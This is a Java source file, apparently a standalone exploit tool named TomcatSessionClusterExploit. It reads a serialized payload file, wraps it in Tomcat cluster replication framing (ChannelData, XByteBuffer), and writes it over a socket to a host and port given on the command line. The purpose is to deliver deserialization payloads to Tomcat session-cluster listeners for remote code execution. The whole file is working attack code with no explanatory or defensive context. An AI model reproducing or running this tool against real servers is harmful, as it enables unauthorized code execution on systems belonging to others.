package com.knight.test;


import java.io.File;
import java.net.Socket;

import com.knight.test.support.ChannelData;
import com.knight.test.support.MemberImpl;
import com.knight.test.support.XByteBuffer;
import org.apache.commons.cli.BasicParser;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.Options;
import org.apache.commons.io.FileUtils;



public class TomcatSessionClusterExploit {

    public static final void main ( String[] args ) throws Exception {
        CommandLineParser parser = new BasicParser();
        Options options = new Options();
        options.addOption("h","host",true,"host");
        options.addOption("p","port",true,"port");
        options.addOption("f","file",true,"serial file");
        CommandLine commandLine = parser.parse(options, args);

        byte[] ser = FileUtils.readFileToByteArray(new File(commandLine.getOptionValue("f")));

        ChannelData data = new ChannelData(true);//generates a unique Id
        data.setAddress(new MemberImpl("127.0.0.1", 11111, 1000));
        data.setTimestamp(System.currentTimeMillis());
        XByteBuffer xByteBuffer = new XByteBuffer(ser.length, false);
        xByteBuffer.append(ser, 0, ser.length);
        data.setMessage(xByteBuffer);
        ser = XByteBuffer.createDataPackage(data);

        Socket socket = new Socket(commandLine.getOptionValue("h"), Integer.parseInt(commandLine.getOptionValue("p")));
        socket.getOutputStream().write(ser);
        socket.getOutputStream().close();
    }
}
